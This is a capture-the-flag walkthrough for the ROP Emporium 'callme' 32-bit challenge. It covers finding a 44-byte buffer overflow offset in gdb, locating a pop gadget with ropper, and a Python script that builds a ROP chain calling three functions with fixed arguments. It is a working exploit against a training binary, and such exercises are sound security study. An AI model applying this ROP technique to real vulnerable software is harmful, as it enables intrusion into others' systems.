## callme:
[Challenge]: https://ropemporium.com/challenge/callme.html
[Video Walkthrough]: https://www.youtube.com/watch?v=abEOdicWhNo&ab_channel=CryptoCat
[PLT Explanation]: https://www.youtube.com/watch?v=kUk5pw4w0h4

>   1. $ sudo apt install radare2
>      $ sudo pip install ropper
>   2. $ rabin2 -i callme32
```
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x080484c0 GLOBAL FUNC       read
2   0x080484d0 GLOBAL FUNC       printf
3   0x080484e0 GLOBAL FUNC       callme_three
4   0x080484f0 GLOBAL FUNC       callme_one
5   0x08048500 GLOBAL FUNC       puts
6   0x00000000 WEAK   NOTYPE     __gmon_start__
7   0x08048510 GLOBAL FUNC       exit
8   0x08048520 GLOBAL FUNC       __libc_start_main
9   0x08048530 GLOBAL FUNC       setvbuf
10  0x08048540 GLOBAL FUNC       memset
11  0x08048550 GLOBAL FUNC       callme_two
```
>    3. Observe pwnme, usefulFunction, and the callme functions
>        $ objdump -d callme32
>           OR
>        Use a reversing framework like Ghidra
>    4. $ gdb callme32
>    5. (gdb) run
>    6. Enter this when prompted and press Enter:
>       aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
>    7. Observe that the EIP register says `0x6161616c`. This is `laaa` in ASCII (remember this is Little Endian architecture so the bytes are backwards)
>    8. Calculate the offset (it's 44)
>    9. (gdb) disassebmle usefulFunction
>    10. Take the addresses of the different callme functions
>    11. Read the ropemporium challenge website above to know the arugments for these functions:
>        For 32 bit it's
```
0xdeadbeef, 0xcafebabe, 0xd00df00d
```
>   12. On a separte terimanl find gadgets to pop 3 off the stack:
>       $ ropper -f callme32 --serach "pop"
>          OR
>       Search manually with `objdump -d callme32`
```
0x080487f9: pop esi; pop edi; pop ebp; ret;
```
>   13. Write this python file:
```
offset = "A" * 44
deadbeef = "\xef\xbe\xad\xde" # "0xdeadbeef"
cafebabe = "\xbe\xba\xfe\xca" # "0xcafebabe"
d00df00d = "\x0d\xf0\x0d\xd0" # "0xd00df00d"
arguments = deadbeef + cafebabe + d00df00d

gadget = "\xf9\x87\x04\x08" # 0x080487f9

callone =   "\xf0\x84\x04\x08" # 0x80484f0
calltwo =   "\x50\x85\x04\x08" # 0x8048550
callthree = "\xe0\x84\x04\x08" # 0x80484e0


print(offset + callone + gadget + arguments + calltwo +  gadget + arguments + callthree + gadget + arguments)
```
>   14. $ python exploit.py > output
>   15. $ ./callme32 < output
